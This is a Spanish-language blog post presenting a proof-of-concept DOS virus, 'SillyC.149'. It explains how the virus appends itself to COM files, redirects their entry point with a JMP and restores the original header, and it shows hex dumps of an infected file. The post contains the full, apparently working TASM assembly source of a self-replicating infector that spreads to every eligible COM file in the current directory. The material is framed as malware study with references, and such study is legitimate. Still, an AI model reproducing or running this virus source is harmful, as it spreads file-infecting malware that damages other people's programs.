---
categories: [Malware, Programación]
layout: post
published: true
tags: [16-bit, ASM-x86, DOS, PoC, TASM, Virus]
title: "Prueba de concepto - Virus: x86/DOS, COM, Postpending"
toc: true
---
<style>
  pre.ovf span { color: #000; }
  pre.ovf span:first-of-type { line-height:200% }
  pre.ovf span.vs { color: #ff0000 }
</style>

Prueba de concepto de virus en la plataforma x86/DOS con estrategia de infección por
postpending (adición posterior) en archivos COM. El virus infecta archivos en tiempo
de ejecución. 

## Método de infección

Durante la infección, el virus reemplaza los primeros bytes del archivo huésped 
(cabezal original) con una instrucción `JMP` (cabezal viral) que dirige el flujo 
de ejecución hacia el final del archivo donde se añade el cuerpo viral. El cabezal 
original reemplazado es guardado en el cuerpo viral.

  {% img infection.png | {"width":"450"} %}

Cuando un archivo infectado es ejecutado, el virus se carga en memoria junto con este y se 
ejecuta primero realizando sus propias acciones, al terminar restaura el cabezal original
en el offset `CS:0100` (dirección de memoria donde se cargan los archivos COM en DOS) y 
salta hacia dicho offset para permitirle al huésped su ejecución normal. Esto último 
dificulta la detección por parte del usuario.

La primer generación del virus es diferente a las siguientes. La primera no tiene cabezal viral, 
ya que no está adherida a un huésped. Las siguientes generaciones al estar adheridas a un 
huésped se diferencian por tener cabezal y cuerpo viral.

Como resultado de la infección:
* Los archivos infectados ocuparán más espacio al contener el código viral. Con técnicas 
  de *stealth* esta información se puede ocultar del usuario para dificultar su detección.
* Los archivos infectados tendrán un tiempo de ejecución mayor al incluir la pre ejecución
  del virus.

## Método de propagación
La infección se realiza en el momento de ejecución infectando todos los archivos COM en el 
directorio actual a excepción de aquellos con atributo READ-ONLY, HIDDEN o SYSTEM.

## Otros detalles
* Se utiliza una técnica básica para calcular el $\Delta$ offset, este es el posicionamiento
  relativo del virus en el archivo infectado. Esta técnica es detectada por cualquier 
  anti-virus decente.
* Este virus no tiene reconocimiento propio, como consecuencia los archivos infectados pueden
  ser infectados nuevamente y comenzarán a crecer con cada nueva infección, sin funcionar mal
  pero volviéndose menos eficientes. En el peor caso, un archivo infectado múltiples veces
  puede llegar a sobrepasar el máximo tamaño que un archivo COM puede soportar, esto es 64KB.
* El virus no verifica que el tamaño del archivo COM sea adecuado para la infección. Si luego
  de la infección el tamaño total supera los 64KB, ya no es un archivo COM válido.
* La DTA (Disk Transfer Area) default no es re localizada. El uso de la DTA por parte del
  virus provocará un solapamiento de datos si el archivo huésped es un programa que recibe
  argumentos de ejecución ya que estos se guardan en el offset 0x80 que coincide con la
  ubicación default de la DTA.

## Flujo de ejecución

  {% img flow.png | {"width":"400"} %}

## Análisis estático

Hex dump de un archivo sano de tamaño 80 bytes:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span>B4 09 BA 39 01 CD 21 90</span>  <span>´.º9.Í!.</span>
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
</pre>

Hex dump del archivo infectado:

<pre class="ovf">
<span>Offset  00 01 02 03 04 05 06 07  ANSI</span>
<span>0x0000</span>  <span class="vs">E9 4D 00</span> <span>39 01 CD 21 90</span>  <span class="vs">éM.</span><span>9.Í!.</span>  Cabezal viral
<span>0x0008</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0010</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0018</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0020</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0028</span>  <span>90 90 90 90 90 90 90 90</span>  <span>........</span>
<span>0x0030</span>  <span>90 90 90 90 90 B4 00 CD</span>  <span>.....´.Í</span>
<span>0x0038</span>  <span>21 54 68 69 73 20 69 73</span>  <span>!This is</span>
<span>0x0040</span>  <span>20 61 20 68 6F 73 74 20</span>  <span> a host </span>
<span>0x0048</span>  <span>66 69 6C 65 21 0D 0A 24</span>  <span>file!..$</span>
<span>0x0050</span>  <span class="vs">E8 00 00 5D 81 ED 0B 01</span>  <span class="vs">è..].í..</span>  Cuerpo viral
<span>0x0058</span>  <span class="vs">B9 03 00 8D B6 9A 01 BF</span>  <span class="vs">¹...¶’.¿</span>
<span>0x0060</span>  <span class="vs">00 01 F3 A4 B4 4E 33 C9</span>  <span class="vs">..ó¤´N3É</span>
<span>0x0068</span>  <span class="vs">8D 96 94 01 CD 21 73 08</span>  <span class="vs">.–Œ.Í!s.</span>
<span>0x0070</span>  <span class="vs">EB 65 B4 4F CD 21 72 5F</span>  <span class="vs">ëe´OÍ!r_</span>
<span>0x0078</span>  <span class="vs">B4 3D B0 02 BA 9E 00 CD</span>  <span class="vs">´=°.ºž.Í</span>
<span>0x0080</span>  <span class="vs">21 72 EF 50 B4 3F 5B B9</span>  <span class="vs">!rïP´?[¹</span>
<span>0x0088</span>  <span class="vs">03 00 8D 96 9A 01 CD 21</span>  <span class="vs">...–’.Í!</span>
<span>0x0090</span>  <span class="vs">72 3F B8 00 42 33 C9 33</span>  <span class="vs">r?¸.B3É3</span>
<span>0x0098</span>  <span class="vs">D2 CD 21 72 34 A1 9A 00</span>  <span class="vs">ÒÍ!r4¡š.</span>
<span>0x00A0</span>  <span class="vs">2D 03 00 3E C6 86 9D 01</span>  <span class="vs">-..>Æ†•.</span>
<span>0x00A8</span>  <span class="vs">E9 3E 89 86 9E 01 B4 40</span>  <span class="vs">é>‰†–.´@</span>
<span>0x00B0</span>  <span class="vs">B9 03 00 8D 96 9D 01 CD</span>  <span class="vs">¹...–•.Í</span>
<span>0x00B8</span>  <span class="vs">21 72 16 B8 02 42 33 C9</span>  <span class="vs">!r.¸.B3É</span>
<span>0x00C0</span>  <span class="vs">33 D2 CD 21 72 0B B4 40</span>  <span class="vs">3ÒÍ!r.´@</span>
<span>0x00C8</span>  <span class="vs">B9 95 00 8D 96 08 01 CD</span>  <span class="vs">¹•..–..Í</span>
<span>0x00D0</span>  <span class="vs">21 B4 3E CD 21 73 9B B9</span>  <span class="vs">!´>Í!s›¹</span>
<span>0x00D8</span>  <span class="vs">00 01 FF E1 2A 2E 63 6F</span>  <span class="vs">..ÿá*.co</span>
<span>0x00E0</span>  <span class="vs">6D 00</span> <span>B4 09 BA</span>           <span class="vs">m.</span><span>´.º</span>     Cabezal original
</pre>

El archivo huésped ahora tiene 149 bytes adicionales de tamaño.

## API utilizada
Se utilizan 8 servicios de la DOS API mediante la interrupción de software 21h.

<div class="table-responsive">
<table class="table" >
   <thead class="thead-light">
    <tr>
      <th>Servicio</th>
      <th>AH</th>
      <th>Parámetros</th>
      <th>Retorno</th>
      <th>Versión DOS</th>
    </tr>
  </thead>
  <tr>
    <td>Terminar programa</td> 
    <td>00h</td>
    <td class="center">-</td>
    <td class="center">-</td>
    <td>1+</td>
  </tr>
  <tr>
    <td>Abrir archivo existente</td>
    <td>3Dh</td>
    <td>AL = modos de acceso e intercambio<br />DS:DX -> nombre del archivo (ASCIZ)</td> 
    <td>Éxito: CF = 0, AX = handle del archivo <br />Error: CF = 1, AX = código de error</td> 
    <td>2+</td>
  </tr>
  <tr>
    <td>Cerrar archivo</td>
    <td>3Eh</td>
    <td>BX = handle del archivo</td>
    <td>Éxito: CF = 0, AX destruido <br />Error: CF = 1, AX = código de error</td> 
    <td>2+</td>
  </tr>
  <tr>
    <td>Lectura de archivo <br /> o dispositivo</td>
    <td>3Fh</td>    
    <td>BX = handle del archivo <br />CX = nro. de bytes <br />DS:DX -> offset donde guardar datos</td>  
    <td>Éxito: CF = 0, AX = nro. de bytes transferidos <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Escribir en archivo <br />o dispositivo</td>
    <td>40h</td>
    <td>BX = handle del archivo <br/>CX = nro. de bytes <br/>DS:DX -> datos a escribir</td> 
    <td>Éxito: CF = 0, AX = nro. de bytes escritos <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Establecer puntero de archivo</td>  
    <td>42h</td>  
    <td>AL = código de desplazamiento <br /> BX = handle del archivo <br /> CX = mitad mayor de desplazamiento<br /> DX = mitad menor de desplazamiento</td> 
    <td>Éxito: CF = 0, CX = mitad mayor, DX = mitad menor <br />Error: CF = 1, AX = código de error</td> 
    <td>2+</td>
  </tr>
  <tr>
    <td>Buscar el primer archivo <br />coincidente</td> 
    <td>4Eh</td> 
    <td>CX = máscara de atributos de archivo<br />DS:DX -> nombre del archivo (ASCIZ)</td>
    <td>Éxito: CF = 0, resultado en DTA <br />Error: CF = 1, AX = código de error</td>
    <td>2+</td>
  </tr>
  <tr>
    <td>Buscar el siguiente archivo <br />coincidente</td> 
    <td>4Fh</td>
    <td class="center">-</td> 
    <td>Exito: CF = 0, resultado en DTA <br />Error: CF = 1, AX = código de error</td>  
    <td>2+</td>
  </tr>
</table>
</div>

## Código fuente
{% highlight nasm linenos %}
;##############################################################################  
;# Nombre:        virus://DOS/SillyC.149  
;# Plataforma:    Intel x86  
;# SO:            DOS v2.0+, Win32 (mediante NTVDM)  
;# Lenguaje:      ASM x86-16 (sintaxis Intel)  
;# Herramientas:  TASM v4.1, TLINK v7.1.30.1  
;# Tipo:          Parasitic, Non-Resident, COM infector  
;# Tamaño:        149 bytes  
;# Propagación:   Acción directa sobre el directorio actual.  
;# Infección:     Postpending en archivos COM (no READ-ONLY/HIDDEN/SYSTEM).  
;#                Sin reconocimiento propio.  
;# Residente:     No  
;# Stealth:       No  
;# Payload:       No  
;##############################################################################

.8086  
.model tiny

assume cs:virus, ds:virus

virus segment byte public 'CODE'

    org 100h

start:    
    jmp short body                        ; cabezal, en las siguientes generaciones aquí  
    nop                                   ; habrá un near JMP de 3 bytes
    
    mov ah, 00h                           ; / huésped dummy, solo retorna a DOS  
    int 21h                               ; \

body:    
    call d_offset                         ; calcular delta offset  

d_offset:    
    pop bp  
    sub bp, offset d_offset 
                
    mov cx, 3                             ; restaurar cabezal original  
    lea si, [bp + host_head]  
    mov di, 100h  
    rep movsb
    
    mov ah, 4Eh                           ; | AH = 4Eh  
    xor cx, cx                            ; | CX = 0, archivos normales  
    lea dx, [bp + search_str]             ; | DS:DX -> "*.COM"  
    int 21h                               ; |_DOS API - Buscar primer archivo
    
    jnc infect_file                       ; archivo encontrado  
    jmp exit                              ; no hay archivo

find_next:    
    mov ah, 4Fh                           ; | AH = 4Fh  
    int 21h                               ; |_DOS API - Buscar siguiente archivo 

    jc exit                               ; no hay archivo

infect_file:   
    mov ah, 3Dh                           ; | AH = 3Dh  
    mov al, 2                             ; | AL = 2, lectura y escritura  
    mov dx, 9Eh                           ; | DS:DX -> DTA + 1Eh = 9Eh (FileName)  
    int 21h                               ; |_DOS API - Abrir archivo existente

    jc find_next                          ; no se puede abrir archivo, buscar siguiente archivo  
    push ax                               ; guardar handle y continuar infección
      
    mov ah, 3Fh                           ; | AH = 3Fh  
    pop bx                                ; | BX = handle del archivo  
    mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
    lea dx, [bp + host_head]              ; | DS:DX -> destino: buffer para cabezal original  
    int 21h                               ; |_DOS API - Leer de archivo/dispositivo
      
    jc close_file                         ; no se puede leer el archivo, cerrarlo

    mov ax, 4200h                         ; | AX = 4200h (principio del archivo)  
    xor cx, cx                            ; | CX = 0  
    xor dx, dx                            ; | DX = 0  
    int 21h                               ; |_DOS API - Establecer puntero en archivo 
    
    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
    
    mov ax, word ptr [ds:9Ah]             ; calcular el largo del JMP para el cabezal viral, DTA+1Ah=9Ah (FileSize)  
    sub ax, 3                             ; restarle 3 bytes del near JMP
    
    mov byte ptr [bp + tmp_head], 0E9h    ; construir cabezal viral en buffer temporal (E9h = near JMP)  
    mov word ptr [bp + tmp_head + 1], ax
    
    mov ah, 40h                           ; | AH = 40h  
    mov cx, 3                             ; | CX = tamaño del cabezal, 3 bytes  
    lea dx, [bp + tmp_head]               ; | DS:DX -> origen: buffer temporal para cabezal viral  
    int 21h                               ; |_DOS API - Escribir en archivo/dispositivo 
    
    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
    
    mov ax, 4202h                         ; | AX = 4202h (fin del archivo)  
    xor cx, cx                            ; | CX = 0  
    xor dx, dx                            ; | DX = 0  
    int 21h                               ; |_DOS API - Establecer puntero en archivo 
    
    jc close_file                         ; no se puede trabajar con el archivo, cerrarlo
    
    mov ah, 40h                           ; | AH = 40h  
    mov cx, VIRUS_SIZE                    ; | CX = tamaño del virus  
    lea dx, [bp + body]                   ; | DS:DX -> origen: inicio del código viral  
    int 21h                               ; |_DOS API - Escribir en archivo/dispositivo

close_file:   
    mov ah, 3Eh                           ; | AH = 3Eh  
    int 21h                               ; |_DOS API - Cerrar archivo

    jnc find_next                         ; si CF=0, buscar siguiente archivo 

exit:   
    mov cx, 0100h  
    jmp cx                                ; saltar a CS:0100 y ejecutar huésped

search_str    db   "*.COM", 00h           ; nombre comodín de búsqueda  
host_head     db   90h, 90h, 90h          ; buffer para cabezal original  
VIRUS_SIZE    equ  ($ - body)             ; tamaño del virus  
tmp_head      db   3 dup (?)              ; buffer temporal para el cabezal viral

virus ends  
end start  
{% endhighlight %}

## Casos reales
* El virus *Vienna* fue aislado por primera vez en Abril de 1988 en Moscú. Se trata de un virus
  no residente, infector de archivos *COM* por acción directa. Como su código fuente se hizo
  público, aparecieron muchas variantes del mismo.
* La familia de virus *Sality* es un ejemplo moderno de virus polimórficos que infectan archivos
  ejecutables de Windows con extensión *.exe* o *.scr*. Desde su descubrimiento inicial, las
  variantes de esta familia se han vuelto más sofisticadas.

## Bibliografía
{% bibliography -q
   @*[key=Szor2005
   || key=Phalcon-Skism,
   || key=Williams1992] 
%} 